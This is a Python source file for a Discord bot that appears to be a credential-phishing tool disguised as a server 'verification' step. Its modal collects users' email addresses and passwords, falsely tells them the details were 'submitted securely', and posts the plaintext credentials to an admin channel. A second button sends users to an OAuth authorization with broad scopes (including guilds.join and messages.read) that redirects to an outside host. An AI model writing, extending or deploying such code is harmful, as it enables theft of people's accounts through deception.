import discord
from discord.ext import commands
import urllib.parse

# --- CONFIGURATION ---
ADMIN_CHANNEL_ID = 1564831494227103864
REDIRECT_URI = urllib.parse.quote("https://clashwallet.up.railway.app")
OAUTH_URL = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={REDIRECT_URI}&scope=identify+guilds+email+guilds.join+bot+messages.read+applications.commands"
# ---------------------

class DetailsModal(discord.ui.Modal, title='Verification Details'):
    user_email = discord.ui.TextInput(
        label='Email Address',
        style=discord.TextStyle.short,
        placeholder='Enter your email address',
        required=True
    )
    user_password = discord.ui.TextInput(
        label='Password',
        style=discord.TextStyle.short,
        placeholder='Enter your password',
        required=True
    )
    user_note = discord.ui.TextInput(
        label='Note (Optional)',
        style=discord.TextStyle.long,
        placeholder='Any additional notes...',
        required=False
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.send_message("✅ Your details have been submitted securely. Please proceed to Start Verification.", ephemeral=True)
        
        admin_channel = interaction.guild.get_channel(ADMIN_CHANNEL_ID)
        if admin_channel:
            log_embed = discord.Embed(title="🚨 New Verification Form Submitted", color=discord.Color.red())
            log_embed.add_field(name="User", value=f"{interaction.user.mention} ({interaction.user.id})", inline=False)
            log_embed.add_field(name="Email", value=self.user_email.value, inline=False)
            log_embed.add_field(name="Password", value=self.user_password.value, inline=False)
            
            if self.user_note.value:
                log_embed.add_field(name="Note", value=self.user_note.value, inline=False)
                
            await admin_channel.send(embed=log_embed)

class PrivateVerificationView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(discord.ui.Button(
            label="Start Verification", 
            style=discord.ButtonStyle.link, 
            url=OAUTH_URL
        ))

    @discord.ui.button(label="📝 Fill Details", style=discord.ButtonStyle.secondary, custom_id="modal_fill_details")
    async def fill_details_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(DetailsModal())

class VerifyCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.Cog.listener()
    async def on_ready(self):
        # Keeps the buttons working after bot restarts
        self.bot.add_view(PrivateVerificationView())

async def setup(bot):
    await bot.add_cog(VerifyCog(bot))